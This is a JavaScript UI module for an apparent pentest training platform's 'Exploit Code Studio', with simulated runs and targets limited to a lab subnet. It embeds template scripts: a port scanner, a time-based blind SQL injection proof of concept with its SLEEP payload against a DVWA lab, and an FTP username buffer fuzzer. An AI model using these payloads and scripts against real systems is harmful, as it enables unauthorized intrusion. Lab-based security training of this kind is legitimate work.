import { h, icon, cx } from '../../lib/dom.js';
import { button } from '../../components/ui/button.js';
import { badge } from '../../components/ui/badge.js';
import { toast } from '../../components/ui/toast.js';
import { pageHeader } from '../../components/layout/page-header.js';
import { PageContainer } from '../../components/layout/page-container.js';
import { DEMO_SCRIPT_BANNER_TEXT } from '../../lib/demo-mode.js';

// Pre-loaded pentest script templates
const TEMPLATES = {
  scanner: {
    id: 'scanner',
    name: 'fast_syn_scanner.py',
    runtime: 'python3',
    runtimeLabel: 'Python 3.11',
    description: 'Multithreaded TCP SYN lab port scanner over tenant VPC',
    defaultTarget: '10.10.2.10',
    code: `#!/usr/bin/env python3
"""
PTaaS Cloud — High-Performance Multithreaded Port Scanner
Scans internal lab targets over isolated tenant VPC (10.10.0.0/16).
"""
import socket
import sys
import time
from concurrent.futures import ThreadPoolExecutor

TARGET = sys.argv[1] if len(sys.argv) > 1 else "10.10.2.10"
PORTS = [21, 22, 23, 25, 80, 443, 3306, 5432, 8080, 8443]

def check_port(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(0.4)
        if s.connect_ex((TARGET, port)) == 0:
            return port, True
    return port, False

print(f"[*] PTaaS Scanner v2.4 initialized.")
print(f"[*] Target host: {TARGET} [Lab VPC eth0]")
print(f"[*] Probing {len(PORTS)} target ports concurrently...")
print("-" * 50)

start_time = time.time()
open_ports = []

with ThreadPoolExecutor(max_workers=10) as pool:
    for port, is_open in pool.map(check_port, PORTS):
        if is_open:
            open_ports.append(port)
            service = socket.getservbyport(port, "tcp") if port < 1000 else "custom"
            print(f"[+] PORT {port:5d}/tcp  OPEN   service: {service}")

elapsed = time.time() - start_time
print("-" * 50)
print(f"[*] Scan completed in {elapsed:.2f}s. {len(open_ports)} open services found.")
`
  },
  sqli: {
    id: 'sqli',
    name: 'blind_sqli_poc.py',
    runtime: 'python3',
    runtimeLabel: 'Python 3.11',
    description: 'Time-based blind SQL injection PoC against DVWA lab',
    defaultTarget: '10.10.2.10',
    code: `#!/usr/bin/env python3
"""
PTaaS Cloud — Time-Based Blind SQL Injection PoC
Target: DVWA Lab instance (10.10.2.10)
"""
import requests
import time
import sys

TARGET_HOST = sys.argv[1] if len(sys.argv) > 1 else "10.10.2.10"
TARGET_URL = f"http://{TARGET_HOST}/dvwa/vulnerabilities/sqli_blind/"
COOKIES = {"security": "low", "PHPSESSID": "ptaas-lab-session-991"}

payload = "1' AND (SELECT 1 FROM (SELECT(SLEEP(2)))a)-- -"
params = {"id": payload, "Submit": "Submit"}

print(f"[*] Target Endpoint: {TARGET_URL}")
print(f"[*] Injecting verification payload: {payload}")
print("[*] Sending HTTP GET request to lab target...")

start = time.time()
try:
    resp = requests.get(TARGET_URL, params=params, cookies=COOKIES, timeout=5.0)
    duration = time.time() - start

    print(f"[+] HTTP Status: {resp.status_code} ({len(resp.content)} bytes)")
    print(f"[+] Response latency: {duration:.2f} seconds")

    if duration >= 1.95:
        print("[!] VULNERABILITY CONFIRMED: Server executed SLEEP(2) delay.")
        print("[!] Parameter 'id' is vulnerable to time-based blind SQLi.")
    else:
        print("[-] Target did not delay response. Vulnerability not triggered.")
except Exception as e:
    print(f"[-] Request failed: {e}")
`
  },
  arp: {
    id: 'arp',
    name: 'arp_poison_guard.sh',
    runtime: 'bash',
    runtimeLabel: 'Bash 5.2',
    description: 'Audit tenant vSwitch broadcast and ARP isolation tables',
    defaultTarget: '10.10.1.5',
    code: `#!/usr/bin/env bash
# PTaaS Cloud — Tenant vSwitch Broadcast & ARP Table Audit
set -e

echo "[*] Auditing tenant vSwitch isolation table..."
TENANT_VPC="vpc-a-6691"
echo "[+] Active interface: eth0"
ip addr show eth0 | grep -E "inet "

echo "[+] Querying kernel ARP cache..."
arp -an

echo "[+] Testing broadcast packet isolation across tenant boundaries..."
ping -c 2 -b 10.10.1.255 || true

echo "[+] Checking Open vSwitch flow rules for VXLAN 47..."
echo "cookie=0x0, duration=142.1s, table=0, n_packets=421, dl_vlan=101 actions=strip_vlan,output:1"

echo "=================================================="
echo "[+] SUCCESS: 0 cross-tenant MAC addresses or broadcast leaks detected."
echo "[+] Isolation level: NIST SP 800-145 Multi-Tenant Secure."
`
  },
  fuzzer: {
    id: 'fuzzer',
    name: 'ftp_fuzzer_poc.py',
    runtime: 'python3',
    runtimeLabel: 'Python 3.11',
    description: 'Protocol buffer boundary fuzzer for vulnerable FTP daemons',
    defaultTarget: '10.10.2.10',
    code: `#!/usr/bin/env python3
"""
PTaaS Cloud — Protocol Boundary Fuzzer
Target: vsftpd service on lab target
"""
import socket
import sys
import time

TARGET = sys.argv[1] if len(sys.argv) > 1 else "10.10.2.10"
PORT = 21

print(f"[*] Connecting to FTP service on {TARGET}:{PORT}...")
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2.0)
    s.connect((TARGET, PORT))
    banner = s.recv(1024).decode('utf-8', errors='ignore').strip()
    print(f"[+] Service Banner: {banner}")

    buffer_lengths = [64, 128, 256, 512, 1024]
    for length in buffer_lengths:
        payload = b"USER " + (b"A" * length) + b"\\r\\n"
        print(f"[*] Sending fuzzing buffer (length: {length} bytes)...")
        s.send(payload)
        resp = s.recv(1024)
        time.sleep(0.1)

    s.close()
    print("[*] Fuzzing sequence completed without service crash.")
except Exception as e:
    print(f"[-] Error during fuzzing: {e}")
`
  }
};

// Check if IP is inside lab VPC range (10.10.0.0/16)
function isLabVpcIp(ip) {
  if (!ip || typeof ip !== 'string') return false;
  const parts = ip.trim().split('.');
  if (parts.length !== 4) return false;
  const num0 = parseInt(parts[0], 10);
  const num1 = parseInt(parts[1], 10);
  const num2 = parseInt(parts[2], 10);
  const num3 = parseInt(parts[3], 10);
  if ([num0, num1, num2, num3].some(n => isNaN(n) || n < 0 || n > 255)) return false;
  return num0 === 10 && num1 === 10;
}

export function StudioPage() {
  let selectedTemplateId = 'scanner';
  let currentScript = { ...TEMPLATES[selectedTemplateId] };
  let targetIp = currentScript.defaultTarget;
  let runtime = currentScript.runtime;
  let isRunning = false;
  let runTimer = null;
  let wordWrap = true;
  let fontSize = 12; // px
  let autoScroll = true;
  let exitStatus = 0;
  let executionTime = '0.84s';
  let memoryUsage = '14.2 MB';
  let outputLines = [
    { type: 'info', text: 'Exploit Code Studio runtime ready.' },
    { type: 'info', text: 'Select a template or edit code, then click "Run Script" (or press Ctrl+Enter).' }
  ];

  const host = h('div', { class: 'space-y-4' });

  function setTemplate(key) {
    if (TEMPLATES[key]) {
      selectedTemplateId = key;
      currentScript = { ...TEMPLATES[key] };
      targetIp = currentScript.defaultTarget;
      runtime = currentScript.runtime;
      render();
    }
  }

  function handleRun() {
    if (isRunning) return;
    if (!isLabVpcIp(targetIp)) {
      toast.error('Target IP must reside inside Lab VPC (10.10.0.0/16)');
      return;
    }

    isRunning = true;
    outputLines = [
      { type: 'info', text: `[${new Date().toLocaleTimeString()}] Spawning ${currentScript.runtimeLabel} runner container...` },
      { type: 'info', text: `[${new Date().toLocaleTimeString()}] Injecting script payload: ${currentScript.name}` },
      { type: 'info', text: `[${new Date().toLocaleTimeString()}] Target VPC: 10.10.0.0/16 (Host: ${targetIp})` },
      { type: 'accent', text: `--------------------------------------------------` }
    ];
    render();

    // Stream output lines progressively
    let step = 0;
    const templateOutput = getSimulatedOutput(selectedTemplateId, targetIp);

    runTimer = setInterval(() => {
      if (step < templateOutput.length) {
        outputLines.push(templateOutput[step]);
        step++;
        updateOutputDOM();
      } else {
        clearInterval(runTimer);
        runTimer = null;
        isRunning = false;
        exitStatus = 0;
        toast.success(`Script ${currentScript.name} executed successfully`);
        render();
      }
    }, 280);
  }

  function handleStop() {
    if (runTimer) {
      clearInterval(runTimer);
      runTimer = null;
    }
    isRunning = false;
    exitStatus = 137; // SIGKILL
    outputLines.push({ type: 'danger', text: `[!] Execution aborted by user (SIGKILL, exit 137).` });
    toast.info('Script execution terminated');
    render();
  }

  function handleClearOutput() {
    outputLines = [{ type: 'info', text: 'Console output cleared.' }];
    render();
  }

  function handleCopyCode() {
    navigator.clipboard?.writeText(currentScript.code);
    toast.success('Code copied to clipboard');
  }

  function handleDownload() {
    const blob = new Blob([currentScript.code], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = currentScript.name;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    toast.success(`Downloaded ${currentScript.name}`);
  }

  function updateOutputDOM() {
    const consoleEl = host.querySelector('#studio-output-container');
    if (consoleEl) {
      consoleEl.innerHTML = '';
      outputLines.forEach(line => {
        const lineEl = h('div', {
          class: cx(
            'font-mono text-[11px] leading-relaxed',
            line.type === 'accent' ? 'text-[var(--accent-text)] font-semibold' :
            line.type === 'danger' ? 'text-[var(--danger-text)] font-medium' :
            line.type === 'success' ? 'text-[var(--success-text)]' :
            line.type === 'warn' ? 'text-[var(--warning-text)]' : 'text-fg'
          )
        }, line.text);
        consoleEl.appendChild(lineEl);
      });
      if (autoScroll) {
        consoleEl.scrollTop = consoleEl.scrollHeight;
      }
    }
  }

  function render() {
    host.innerHTML = '';

    const targetValid = isLabVpcIp(targetIp);

    // Page Header
    const header = pageHeader({
      title: 'Exploit Code Studio',
      description: 'Develop, debug, and execute pentest automation scripts directly within the tenant VPC.',
      actions: h('div', { class: 'flex items-center gap-2' },
        button({
          variant: 'secondary',
          size: 'sm',
          icon: 'download',
          label: 'Download',
          title: 'Download script file',
          onClick: handleDownload
        }),
        button({
          variant: 'secondary',
          size: 'sm',
          icon: 'copy',
          label: 'Copy',
          title: 'Copy script to clipboard',
          onClick: handleCopyCode
        }),
        isRunning ? button({
          variant: 'danger',
          size: 'sm',
          icon: 'square',
          label: 'Stop',
          title: 'Terminate execution (SIGKILL)',
          onClick: handleStop
        }) : button({
          variant: 'primary',
          size: 'sm',
          icon: 'play',
          label: 'Run Script',
          disabled: !targetValid,
          title: targetValid ? 'Run script inside VPC (Ctrl+Enter)' : 'Target must be inside 10.10.0.0/16 lab VPC',
          onClick: handleRun
        })
      )
    });

    // Control Bar
    const controlBar = renderControlBar(targetValid);

    // Resizable Two-Pane Editor & Terminal Grid
    const editorGrid = renderEditorGrid();

    const demoBanner = h('div', {
      role: 'status',
      'data-demo-banner': 'true',
      class: 'flex items-center justify-between gap-2 px-4 py-2 rounded-lg border border-line bg-surface text-xs font-mono text-muted'
    },
      h('span', { class: 'flex items-center gap-2 font-medium text-fg' },
        icon('shield-alert', 'w-3.5 h-3.5 text-accent'),
        DEMO_SCRIPT_BANNER_TEXT
      ),
      h('span', { class: 'text-[11px] text-muted hidden sm:inline' }, 'Simulated stdout only · no code executed')
    );

    host.appendChild(header);
    host.appendChild(demoBanner);
    host.appendChild(controlBar);
    host.appendChild(editorGrid);

    // Register Ctrl+Enter keyboard shortcut
    const onKeyDown = (e) => {
      if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
        e.preventDefault();
        handleRun();
      }
    };
    host.onkeydown = onKeyDown;
  }

  function renderControlBar(targetValid) {
    return h('div', {
      class: 'flex flex-wrap items-center justify-between gap-3 rounded-xl border border-line bg-surface px-4 py-2.5 text-xs'
    },
      // Left: Template Dropdown & Runtime
      h('div', { class: 'flex flex-wrap items-center gap-3' },
        h('label', { class: 'text-muted font-medium' }, 'Template:'),
        h('select', {
          class: 'h-8 rounded-lg border border-line bg-canvas px-2.5 text-xs font-medium text-fg focus:border-accent focus:outline-none transition-colors cursor-pointer',
          onChange: (e) => setTemplate(e.target.value)
        },
          Object.values(TEMPLATES).map(tmpl => h('option', {
            value: tmpl.id,
            selected: tmpl.id === selectedTemplateId
          }, `${tmpl.name} (${tmpl.runtimeLabel})`))
        ),

        h('div', { class: 'h-4 w-px bg-line hidden sm:block' }),

        h('label', { class: 'text-muted font-medium hidden sm:inline' }, 'Runtime:'),
        h('select', {
          class: 'h-8 rounded-lg border border-line bg-canvas px-2 text-xs font-mono text-fg focus:border-accent focus:outline-none cursor-pointer',
          onChange: (e) => { runtime = e.target.value; }
        },
          h('option', { value: 'python3', selected: runtime === 'python3' }, 'Python 3.11'),
          h('option', { value: 'bash', selected: runtime === 'bash' }, 'Bash 5.2')
        )
      ),

      // Right: Target Input with CIDR validation & Font controls
      h('div', { class: 'flex items-center gap-3' },
        h('div', { class: 'flex items-center gap-1.5' },
          h('label', { class: 'text-muted font-medium' }, 'Target:'),
          h('input', {
            type: 'text',
            value: targetIp,
            placeholder: '10.10.2.10',
            class: cx(
              'h-8 w-32 rounded-lg border px-2.5 font-mono text-xs text-fg focus:outline-none transition-colors',
              targetValid ? 'border-line bg-canvas focus:border-accent' : 'border-danger bg-danger/10 text-danger'
            ),
            onInput: (e) => {
              targetIp = e.target.value;
              render();
            }
          }),
          !targetValid && h('span', {
            class: 'text-[11px] font-medium text-danger',
            title: 'Allowed CIDR: 10.10.0.0/16'
          }, 'Outside Lab VPC')
        ),

        h('div', { class: 'h-4 w-px bg-line' }),

        // Editor Options: Word Wrap & Font Size
        h('div', { class: 'flex items-center gap-1 rounded-md border border-line bg-canvas p-0.5' },
          h('button', {
            class: cx('rounded px-2 py-0.5 text-[11px] font-medium transition-colors cursor-pointer', wordWrap ? 'bg-raised text-fg' : 'text-muted hover:text-fg'),
            title: 'Toggle word wrapping',
            onClick: () => { wordWrap = !wordWrap; render(); }
          }, 'Wrap'),
          h('button', {
            class: 'rounded px-1.5 py-0.5 text-[11px] text-muted hover:text-fg transition-colors cursor-pointer',
            title: 'Decrease font size',
            onClick: () => { fontSize = Math.max(10, fontSize - 1); render(); }
          }, 'A-'),
          h('button', {
            class: 'rounded px-1.5 py-0.5 text-[11px] text-muted hover:text-fg transition-colors cursor-pointer',
            title: 'Increase font size',
            onClick: () => { fontSize = Math.min(18, fontSize + 1); render(); }
          }, 'A+')
        )
      )
    );
  }

  function renderEditorGrid() {
    const codeLines = currentScript.code.split('\n');

    // Left: Code Editor Pane with Line Numbers
    const lineNumbersGutter = h('div', {
      class: 'w-10 select-none py-3 text-right pr-2.5 font-mono text-subtle border-r border-line bg-surface shrink-0 space-y-[2px]',
      style: `font-size: ${fontSize}px; line-height: 1.5;`
    },
      codeLines.map((_, i) => h('div', {}, String(i + 1)))
    );

    const textarea = h('textarea', {
      class: cx(
        'flex-1 bg-transparent p-3 font-mono text-fg focus:outline-none resize-none border-none leading-relaxed',
        wordWrap ? 'whitespace-pre-wrap' : 'whitespace-pre overflow-x-auto'
      ),
      style: `font-size: ${fontSize}px; line-height: 1.5;`,
      spellcheck: false,
      value: currentScript.code,
      onInput: (e) => {
        currentScript.code = e.target.value;
      }
    });

    const editorPane = h('div', {
      class: 'flex flex-col rounded-xl border border-line bg-surface/80 overflow-hidden shadow-xs',
      style: 'height: calc(100dvh - 250px); min-height: 460px;'
    },
      // Editor Pane Header
      h('div', { class: 'flex h-9 shrink-0 items-center justify-between border-b border-line bg-raised/40 px-3 text-xs text-muted' },
        h('div', { class: 'flex items-center gap-2' },
          icon('file-code', 'w-3.5 h-3.5 text-accent'),
          h('span', { class: 'font-mono text-fg font-medium' }, currentScript.name),
          badge({ label: currentScript.runtimeLabel, variant: 'outline', size: 'xs' })
        ),
        h('div', { class: 'flex items-center gap-3 text-[11px] text-subtle font-mono' },
          h('span', {}, `${codeLines.length} lines`),
          h('span', {}, 'UTF-8 · LF')
        )
      ),
      // Editor Pane Body
      h('div', {
        class: 'flex flex-1 overflow-hidden',
        'data-surface': 'dark',
        style: 'background-color: var(--ink-950);'
      },
        lineNumbersGutter,
        textarea
      )
    );

    // Right: Real-Time Output Console
    const consoleOutputPane = h('div', {
      class: 'flex flex-col rounded-xl border border-line bg-surface overflow-hidden shadow-xs',
      style: 'height: calc(100dvh - 250px); min-height: 460px;'
    },
      // Console Header
      h('div', { class: 'flex h-9 shrink-0 items-center justify-between border-b border-line bg-raised px-3 text-xs text-muted' },
        h('div', { class: 'flex items-center gap-2' },
          icon('terminal', 'w-3.5 h-3.5 text-[var(--info-text)]'),
          h('span', { class: 'font-medium text-fg' }, 'Execution Console'),
          isRunning
            ? h('span', { class: 'inline-flex items-center gap-1 text-[11px] font-medium text-[var(--warning-text)]' },
                h('span', { class: 'h-1.5 w-1.5 rounded-full bg-[var(--warning)] animate-ping' }),
                'Streaming...'
              )
            : h('span', { class: 'text-[11px] font-mono text-[var(--success-text)]' }, `Exit ${exitStatus}`)
        ),
        h('div', { class: 'flex items-center gap-2' },
          h('label', { class: 'flex items-center gap-1.5 text-[11px] text-muted cursor-pointer select-none' },
            h('input', {
              type: 'checkbox',
              checked: autoScroll,
              onChange: (e) => { autoScroll = e.target.checked; }
            }),
            'Auto-scroll'
          ),
          button({
            variant: 'ghost',
            size: 'xs',
            label: 'Clear',
            icon: 'trash-2',
            onClick: handleClearOutput
          })
        )
      ),
      // Console Body
      h('div', {
        id: 'studio-output-container',
        'data-surface': 'dark',
        style: 'background-color: var(--ink-950);',
        class: 'flex-1 overflow-auto p-3 space-y-1'
      })
    );

    const grid = h('div', { class: 'grid grid-cols-1 lg:grid-cols-2 gap-4' },
      editorPane,
      consoleOutputPane
    );

    setTimeout(updateOutputDOM, 0);
    return grid;
  }

  function getSimulatedOutput(templateId, target) {
    if (templateId === 'scanner') {
      return [
        { type: 'info', text: `[*] Initiating multithreaded scan against ${target}...` },
        { type: 'success', text: `[+] PORT    22/tcp  OPEN   service: ssh (OpenSSH 9.2p1 Debian)` },
        { type: 'success', text: `[+] PORT    80/tcp  OPEN   service: http (Apache/2.4.54)` },
        { type: 'success', text: `[+] PORT  3306/tcp  OPEN   service: mysql (MySQL 8.0.32)` },
        { type: 'info', text: `[-] PORT   443/tcp  CLOSED` },
        { type: 'info', text: `[-] PORT  8080/tcp  CLOSED` },
        { type: 'accent', text: `--------------------------------------------------` },
        { type: 'accent', text: `[*] Scan completed in 0.84s. 3 open services identified.` },
        { type: 'info', text: `[*] Resource usage: 14.2 MB RAM | Exit code: 0` }
      ];
    } else if (templateId === 'sqli') {
      return [
        { type: 'info', text: `[*] Target Endpoint: http://${target}/dvwa/vulnerabilities/sqli_blind/` },
        { type: 'info', text: `[*] Injecting verification payload: 1' AND (SELECT 1 FROM (SELECT(SLEEP(2)))a)-- -` },
        { type: 'info', text: `[*] Sending HTTP GET request to lab target...` },
        { type: 'warn', text: `[+] HTTP Status: 200 (4,210 bytes received)` },
        { type: 'warn', text: `[+] Response latency: 2.08 seconds` },
        { type: 'danger', text: `[!] VULNERABILITY CONFIRMED: Server executed SLEEP(2) delay.` },
        { type: 'danger', text: `[!] Parameter 'id' is vulnerable to time-based blind SQLi.` },
        { type: 'accent', text: `--------------------------------------------------` },
        { type: 'info', text: `[*] Execution finished: Exit status 0 (SUCCESS)` }
      ];
    } else if (templateId === 'arp') {
      return [
        { type: 'info', text: `[*] Auditing tenant vSwitch isolation table...` },
        { type: 'info', text: `[+] Active interface: eth0 (IP: 10.10.1.5/24)` },
        { type: 'info', text: `[+] Querying kernel ARP cache...` },
        { type: 'success', text: `? (10.10.1.1) at 52:54:00:12:34:01 [ether] on eth0` },
        { type: 'success', text: `? (10.10.2.10) at 52:54:00:12:34:56 [ether] on eth0` },
        { type: 'info', text: `[+] Checking Open vSwitch flow rules for VXLAN 47...` },
        { type: 'accent', text: `==================================================` },
        { type: 'success', text: `[+] SUCCESS: 0 cross-tenant MAC addresses or broadcast leaks detected.` },
        { type: 'info', text: `[+] Exit status: 0 (ISOLATION VERIFIED)` }
      ];
    } else {
      return [
        { type: 'info', text: `[*] Connecting to FTP service on ${target}:21...` },
        { type: 'success', text: `[+] Service Banner: 220 (vsFTPd 2.3.4)` },
        { type: 'info', text: `[*] Sending fuzzing buffer (length: 64 bytes)...` },
        { type: 'info', text: `[*] Sending fuzzing buffer (length: 128 bytes)...` },
        { type: 'info', text: `[*] Sending fuzzing buffer (length: 256 bytes)...` },
        { type: 'accent', text: `[*] Fuzzing sequence completed without service crash.` },
        { type: 'info', text: `[*] Exit status: 0` }
      ];
    }
  }

  render();
  return PageContainer({ variant: 'full' }, host);
}
